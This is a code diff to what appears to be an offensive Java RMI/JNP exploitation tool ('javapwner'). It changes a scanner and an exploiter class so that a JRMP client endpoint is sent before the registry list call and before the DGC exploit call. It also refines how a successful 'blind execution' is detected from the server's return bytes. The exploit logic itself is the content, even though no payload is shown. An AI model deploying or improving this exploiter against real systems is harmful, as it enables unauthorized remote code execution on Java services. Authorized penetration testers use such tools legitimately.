@@ -34,7 +34,10 @@ from javapwner.exceptions import ConnectionError as JPConnectionError
 from javapwner.protocols.rmi.protocol import (
     DGC_OBJID,
     MSG_CALL,
+    MSG_RETURN,
+    RETURN_EXCEPTION,
     build_jrmp_handshake,
+    build_client_endpoint,
     build_list_call,
     parse_jrmp_ack,
     parse_registry_return,
@@ -141,6 +144,7 @@ class JnpScanner:
                 except ValueError:
                     return result
 
+                sess.send(build_client_endpoint())
                 sess.send(build_list_call())
                 raw = sess.recv_all(timeout=_RECV_TIMEOUT)
                 if not raw:
@@ -214,6 +218,7 @@ class JnpExploiter:
                     result.error = str(exc)
                     return result
 
+                sess.send(build_client_endpoint())
                 sess.send(dgc_call)
                 result.sent = True
 
@@ -222,7 +227,7 @@ class JnpExploiter:
                     result.response_bytes = response
                     if detect_exception_in_stream(response):
                         result.likely_success = False
-                    else:
+                    elif response and len(response) >= 2 and response[0] == MSG_RETURN and response[1] != RETURN_EXCEPTION:
                         result.likely_success = True
                 except Exception:
                     result.likely_success = True  # blind execution
